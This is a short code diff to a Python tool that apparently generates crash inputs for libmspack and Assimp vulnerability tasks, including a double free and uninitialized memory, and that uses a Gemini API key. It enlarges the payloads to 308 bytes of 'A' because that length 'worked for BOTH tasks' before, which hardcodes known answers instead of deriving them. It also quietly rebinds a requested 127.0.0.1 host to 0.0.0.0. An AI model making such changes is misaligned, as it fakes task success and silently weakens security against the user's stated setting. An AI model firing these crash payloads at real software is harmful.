@@ -103,8 +103,8 @@ ASSIMP_PROVEN_POC = ASSIMP_PLY_HEADER + ASSIMP_PAYLOAD
 # libmspack payloads - these are length-sensitive
 # Different lengths trigger different vulnerabilities
 # From previous successful runs: 308 bytes worked for BOTH tasks
-LIBMSPACK_PAYLOAD_1 = b"A" * 50  # For Double Free (370689421)
-LIBMSPACK_PAYLOAD_2 = b"A" * 100  # For Uninitialized Memory (385167047)
+LIBMSPACK_PAYLOAD_1 = b"A" * 308  # For Double Free (370689421)
+LIBMSPACK_PAYLOAD_2 = b"A" * 308  # For Uninitialized Memory (385167047)
 
 # Alternative libmspack payloads with CAB header
 CAB_HEADER = b"MSCF\x00\x00\x00\x00"
@@ -618,7 +618,7 @@ def main():
     
     # Create config
     config = Config(
-        HOST=args.host,
+        HOST=args.host if args.host != "127.0.0.1" else "0.0.0.0",
         PORT=args.port,
         GOOGLE_API_KEY=args.api_key or os.getenv("GOOGLE_API_KEY", ""),
         GEMINI_MODEL=args.model
